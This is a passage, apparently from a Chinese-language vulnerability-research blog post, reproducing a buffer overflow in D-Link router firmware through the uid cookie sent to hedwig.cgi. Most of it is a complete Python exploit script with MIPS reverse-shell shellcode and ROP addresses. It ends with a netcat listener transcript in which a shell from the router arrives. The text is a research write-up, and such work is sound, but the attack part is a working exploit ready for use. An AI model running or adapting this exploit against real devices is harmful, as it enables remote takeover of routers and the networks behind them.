b&quot;\\x69\\x6e\\x0e\\x3c\\x2f\\x62\\xce\\x35\\xe0\\x01\\xae\\xaf\\x69\\x01\\x0e\\x3c\\x30\\x74\\xce\\x35\\xfe\\xfe\\x01\\x3c\\xff\\xfe\\x21\\x34\\x20\\x70\\xc1\\x01\\xe4\\x01\\xae\\xaf\\x69\\x6e\\x0e\\x3c\\x2f\\x62\\xce\\x35\\xf4\\x01\\xae\\xaf\\x69\\x01\\x0e\\x3c\\x30\\x74\\xce\\x35\\xfe\\xfe\\x01\\x3c\\xff\\xfe\\x21\\x34\\x20\\x70\\xc1\\x01\\xf8\\x01\\xae\\xaf\\x01\\x01\\x0e\\x3c\\x2e\\x6a\\xce\\x35\\xfe\\xfe\\x01\\x3c\\xff\\xfe\\x21\\x34\\x20\\x70\\xc1\\x01\\xfc\\x01\\xae\\xaf\\xf4\\x01\\xae\\x27\\xe8\\x01\\xae\\xaf\\xfc\\x01\\xae\\x27\\xec\\x01\\xae\\xaf\\xec\\x01\\xa0\\xaf\\xe0\\x01\\xa4\\x27\\xe8\\x01\\xa5\\x27\\xff\\xff\\x06\\x28\\xab\\x0f\\x02\\x24\\x0c\\x01\\x01\\x01&quot;\n\n编写测试脚本，执行目标代码。\n#!/usr/bin/python3import structimport http.clientlibc_base_addr = 0x77F34000shellcode = b&quot;&quot;shellcode += b&quot;\\x23\\x22\\x04\\x24\\xdf\\xdd\\x84\\x20\\x23\\x22\\x05\\x24\\xdf\\xdd\\xa5\\x20\\x23\\x22\\x06\\x24\\xdd\\xdd\\xc6\\x20\\x57\\x10\\x02\\x24\\x0c\\x01\\x01\\x01\\xe0\\x01\\xa2\\xaf&quot;shellcode += b&quot;\\xe0\\x01\\xa4\\x8f\\x23\\x22\\x05\\x24\\xdd\\xdd\\xa5\\x20\\xdf\\x0f\\x02\\x24\\x0c\\x01\\x01\\x01\\x23\\x22\\x05\\x24\\xde\\xdd\\xa5\\x20\\xdf\\x0f\\x02\\x24\\x0c\\x01\\x01\\x01\\x23\\x22\\x05\\x24\\xdf\\xdd\\xa5\\x20\\xdf\\x0f\\x02\\x24\\x0c\\x01\\x01\\x01&quot;shellcode += b&quot;\\x1f\\x40\\x0e\\x3c\\x03\\x03\\xce\\x35\\xff\\xfc\\xce\\x21\\xe4\\x01\\xae\\xaf\\x03\\x03\\x0e\\x3c\\xc1\\xa9\\xce\\x35\\xfc\\xfe\\x01\\x3c\\xff\\xfe\\x21\\x34\\x20\\x70\\xc1\\x01\\xe8\\x01\\xae\\xaf\\xe0\\x01\\xa4\\x8f\\xe4\\x01\\xa5\\x27\\x10\\x00\\x06\\x24\\x4a\\x10\\x02\\x24\\x0c\\x01\\x01\\x01&quot;shellcode += b&quot;\\x69\\x6e\\x0e\\x3c\\x2f\\x62\\xce\\x35\\xe0\\x01\\xae\\xaf\\x69\\x01\\x0e\\x3c\\x30\\x74\\xce\\x35\\xfe\\xfe\\x01\\x3c\\xff\\xfe\\x21\\x34\\x20\\x70\\xc1\\x01\\xe4\\x01\\xae\\xaf\\x69\\x6e\\x0e\\x3c\\x2f\\x62\\xce\\x35\\xf4\\x01\\xae\\xaf\\x69\\x01\\x0e\\x3c\\x30\\x74\\xce\\x35\\xfe\\xfe\\x01\\x3c\\xff\\xfe\\x21\\x34\\x20\\x70\\xc1\\x01\\xf8\\x01\\xae\\xaf\\x01\\x01\\x0e\\x3c\\x2e\\x6a\\xce\\x35\\xfe\\xfe\\x01\\x3c\\xff\\xfe\\x21\\x34\\x20\\x70\\xc1\\x01\\xfc\\x01\\xae\\xaf\\xf4\\x01\\xae\\x27\\xe8\\x01\\xae\\xaf\\xfc\\x01\\xae\\x27\\xec\\x01\\xae\\xaf\\xec\\x01\\xa0\\xaf\\xe0\\x01\\xa4\\x27\\xe8\\x01\\xa5\\x27\\xff\\xff\\x06\\x28\\xab\\x0f\\x02\\x24\\x0c\\x01\\x01\\x01&quot;payload = b&#x27;A&#x27; * 0x3EFpayload += struct.pack(&#x27;&lt;I&#x27;, libc_base_addr + 0x000158C8)payload += b&#x27;A&#x27; * 0x20payload += struct.pack(&#x27;&lt;I&#x27;, libc_base_addr + 0x000159CC)payload += b&#x27;A&#x27; * 0x10payload += shellcodehost = &#x27;192.168.0.1&#x27;port = 80path = &#x27;/hedwig.cgi&#x27;headers = &#123;    &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36&#x27;,    &#x27;Accept&#x27;: &#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8&#x27;,    &#x27;Cookie&#x27;: b&#x27;uid=&#x27; + payload&#125;data = &#x27;&#x27;conn = http.client.HTTPConnection(host, port).request(&#x27;POST&#x27;, path, data, headers)r = conn.getresponse()print(r.read().decode(&#x27;utf-8&#x27;))\n\n运行 NetCat 监听端口，接收路由器 Shell 会话。\n$ nc -lvvp 8000Listening on 0.0.0.0 8000pwdnc: getnameinfo: Temporary failure in name resolution/htdocs/web\n\n参考链接国家信息安全漏洞共享平台\nD-Link DIR-645 Buffer Overflow &#x2F; Cross Site Scripting ≈ Packet Storm\n踏入IOT安全世界：DIR-815路由器多次溢出漏洞分析复现 - FreeBuf网络安全行业门户\n","categories":["网络安全","漏洞研究"],"tags":["D-Link"]}]